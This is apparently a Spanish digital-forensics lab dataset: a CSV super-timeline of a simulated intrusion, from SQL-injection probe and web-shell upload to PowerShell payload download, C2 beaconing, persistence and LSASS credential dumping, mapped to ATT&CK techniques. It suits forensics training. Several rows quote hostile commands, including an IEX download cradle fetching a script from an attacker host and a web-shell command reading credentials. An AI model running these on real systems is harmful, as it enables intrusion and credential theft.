@@ -1,0 +1,21 @@
+datetime,timestamp_desc,source,host,user,description
+2027-01-14T09:12:44Z,Content Modification Time,WEBLOG,portal-soc,-,"nginx access: 10.10.10.66 GET /login.php?id=1' OR '1'='1  (401) — sondeo SQLi"
+2027-01-14T09:38:02Z,Content Modification Time,WEBLOG,portal-soc,-,"nginx access: 10.10.10.66 POST /login.php (302) — autenticacion correcta como 'webadmin'"
+2027-01-14T09:41:17Z,Content Modification Time,WEBLOG,portal-soc,-,"nginx access: 10.10.10.66 POST /admin/upload.php (200) — subida de shell.php (T1190/T1505.003)"
+2027-01-14T09:55:31Z,Content Modification Time,WEBLOG,portal-soc,-,"nginx access: 10.10.10.66 GET /uploads/shell.php?cmd=cat+/var/www/config.php (200) — lectura de credenciales de BD"
+2027-01-14T10:20:55Z,Creation Time,EVTX-Security,WIN-XEST-ADM,admin,"Event 4624 Logon Type 10 (RemoteInteractive/RDP) desde 10.10.10.66, cuenta 'admin' (T1078/T1021.001)"
+2027-01-14T10:20:58Z,Creation Time,MEMORY,WIN-XEST-ADM,admin,"Proceso explorer.exe (PID 2984) creado — sesion interactiva RDP"
+2027-01-14T10:24:03Z,Creation Time,EVTX-PowerShell,WIN-XEST-ADM,admin,"Event 4104 ScriptBlock: IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.66:8080/a.ps1') (T1059.001)"
+2027-01-14T10:24:07Z,Network Connection,MEMORY,WIN-XEST-ADM,admin,"powershell.exe (3120) -> 10.10.10.66:8080 — descarga de a.ps1 (T1105)"
+2027-01-14T10:25:41Z,Creation Time,MEMORY,WIN-XEST-ADM,admin,"Proceso svchost32.exe (PID 4812) creado desde powershell.exe — segundo estadio"
+2027-01-14T10:25:44Z,Creation Time,MFT,WIN-XEST-ADM,admin,"Fichero creado: C:\Users\admin\AppData\Local\Temp\svchost32.exe (T1105)"
+2027-01-14T10:25:58Z,Network Connection,MEMORY,WIN-XEST-ADM,admin,"svchost32.exe (4812) -> 10.10.10.66:4444 ESTABLISHED — canal C2 (T1571)"
+2027-01-14T10:28:11Z,Content Modification Time,REGISTRY,WIN-XEST-ADM,admin,"HKCU\...\Run\WindowsUpdate = ...\Temp\svchost32.exe (T1547.001)"
+2027-01-14T10:28:14Z,Creation Time,EVTX-TaskScheduler,WIN-XEST-ADM,admin,"Tarea \Microsoft\Windows\UpdateOrchestrator\SysHealth creada -> svchost32.exe (T1053.005)"
+2027-01-14T10:35:02Z,Creation Time,MEMORY,WIN-XEST-ADM,admin,"Proceso cmd.exe (PID 5044) desde svchost32.exe: 'whoami /priv & net user' — reconocimiento (T1033/T1087)"
+2027-01-14T10:35:29Z,Access Time,EVTX-Security,WIN-XEST-ADM,admin,"Event 4656 acceso a lsass.exe con 0x1010 (PROCESS_VM_READ) — volcado de credenciales (T1003.001)"
+2027-01-14T10:58:12Z,Network Connection,WEBLOG,portal-soc,-,"nginx access: 10.10.10.50 -> 10.10.10.66:4444 trafico saliente sostenido (baliza C2)"
+
+# Dataset de laboratorio IC UT6. Super-timeline (estilo plaso/log2timeline) que fusiona
+# MFT, registro, EVTX, memoria y logs web. Ordenala y reconstruye la intrusion de punta a punta.
+# Filtrado tipico:  awk -F, 'NR>1' timeline-supertimeline.csv | sort   (ya viene ordenada)
